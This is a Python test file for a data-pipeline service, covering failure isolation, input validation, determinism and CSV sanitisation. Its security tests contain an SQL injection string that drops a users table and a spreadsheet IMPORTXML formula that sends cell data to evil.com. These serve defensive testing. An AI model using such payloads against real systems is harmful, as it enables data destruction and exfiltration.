"""Failure scenario tests — proves the system degrades gracefully."""
import pytest
import pandas as pd
from unittest.mock import patch


class TestPipelineFailureIsolation:
    def test_bad_step_does_not_stop_others(self):
        from app.services.executor import execute_pipeline
        df = pd.DataFrame({"x": [1.0, 2.0, 3.0]})
        steps = [
            {"action": "normalize",           "params": {"columns": ["x"]}},
            {"action": "totally_fake_action", "params": {}},
            {"action": "remove_duplicates",   "params": {"columns": []}},
        ]
        report, result = execute_pipeline(steps, df)
        assert report["status"] == "partial"
        assert report["steps_ok"] == 2
        assert report["steps_failed"] == 1
        assert len(result) > 0

    def test_all_steps_fail_returns_original(self):
        from app.services.executor import execute_pipeline
        df = pd.DataFrame({"x": [1, 2, 3]})
        steps = [{"action": "fake_1", "params": {}}, {"action": "fake_2", "params": {}}]
        report, result = execute_pipeline(steps, df)
        assert report["status"] == "failure"
        assert report["steps_ok"] == 0
        pd.testing.assert_frame_equal(result, df)

    def test_empty_dataframe_graceful(self):
        from app.services.executor import execute_pipeline
        df = pd.DataFrame({"x": pd.Series([], dtype=float)})
        steps = [
            {"action": "drop_nulls",     "params": {"columns": []}},
            {"action": "normalize",      "params": {"columns": ["x"]}},
        ]
        report, result = execute_pipeline(steps, df)
        assert report["status"] == "success"
        assert len(result) == 0

    def test_step_log_captures_error(self):
        from app.services.executor import execute_pipeline
        df = pd.DataFrame({"x": [1, 2, 3]})
        steps = [{"action": "nonexistent_action", "params": {}}]
        report, _ = execute_pipeline(steps, df)
        assert report["log"][0]["status"] == "error"
        assert "nonexistent_action" in report["log"][0]["error"]


class TestValidatorSecurity:
    def test_sql_injection_rejected(self):
        from app.services.validator import validate_step
        r = validate_step({"action": "'; DROP TABLE users; --", "params": {}})
        assert not r["valid"]

    def test_none_rejected(self):
        from app.services.validator import validate_step
        assert not validate_step(None)["valid"]

    def test_list_rejected(self):
        from app.services.validator import validate_step
        assert not validate_step([{"action": "drop_nulls"}])["valid"]

    def test_extra_nested_params_rejected(self):
        from app.services.validator import validate_step
        r = validate_step({"action": "normalize", "params": {"columns": [], "extra": {"nested": "evil"}}})
        assert not r["valid"]

    def test_200_steps_validated_fast(self):
        import time
        from app.services.validator import validate_pipeline_steps
        steps = [{"action": "drop_nulls", "params": {"columns": []}} for _ in range(200)]
        t0 = time.perf_counter()
        result = validate_pipeline_steps(steps, ["col1", "col2"])
        elapsed = time.perf_counter() - t0
        assert not result["has_hard_errors"]
        assert elapsed < 1.0, f"Validator took {elapsed:.2f}s — too slow"


class TestConcurrencyIsolation:
    def test_transforms_no_shared_state(self):
        from app.services.transforms import ACTION_REGISTRY
        df1 = pd.DataFrame({"x": [1.0, 2.0, 100.0, 4.0, 5.0]})
        df2 = pd.DataFrame({"x": [1.0, 2.0, 100.0, 4.0, 5.0]})
        r1 = ACTION_REGISTRY["remove_outliers"](df1, {"columns": ["x"]})
        r2 = ACTION_REGISTRY["remove_outliers"](df2, {"columns": ["x"]})
        pd.testing.assert_frame_equal(r1, r2)

    def test_normalize_no_mutation(self):
        from app.services.transforms import ACTION_REGISTRY
        df = pd.DataFrame({"x": [10.0, 20.0, 30.0]})
        original = df.copy()
        ACTION_REGISTRY["normalize"](df, {"columns": ["x"]})
        pd.testing.assert_frame_equal(df, original)

    def test_determinism_across_10_runs(self):
        from app.services.executor import execute_pipeline
        df = pd.DataFrame({"x": [5.0, 1.0, 3.0, None, 2.0]})
        steps = [
            {"action": "fill_nulls", "params": {"columns": ["x"], "method": "mean"}},
            {"action": "normalize",  "params": {"columns": ["x"]}},
        ]
        results = [execute_pipeline(steps, df.copy())[1] for _ in range(10)]
        for i in range(1, 10):
            pd.testing.assert_frame_equal(results[0], results[i], rtol=1e-10)


class TestSecurityFailures:
    def test_formula_injection_sanitized_not_crashed(self):
        from app.core.security.csv_sanitizer import validate_and_sanitize_csv
        content = b"cmd\n=IMPORTXML(concat(\"http://evil.com/?x=\",A1),\"//a\")"
        result = validate_and_sanitize_csv(content)
        assert result.df is not None
        assert result.cells_sanitized >= 1

    def test_profiler_all_null_column_no_crash(self):
        from app.services.profiler import profile_dataframe
        df = pd.DataFrame({"null_col": [None, None, None], "ok": [1, 2, 3]})
        profile = profile_dataframe(df)
        assert "profiles" in profile

    def test_profiler_constant_column_no_divide_by_zero(self):
        from app.services.profiler import profile_dataframe
        df = pd.DataFrame({"constant": [5, 5, 5, 5, 5]})
        profile = profile_dataframe(df)
        assert profile["profiles"][0]["std"] == 0.0
        assert profile["health_score"] >= 0
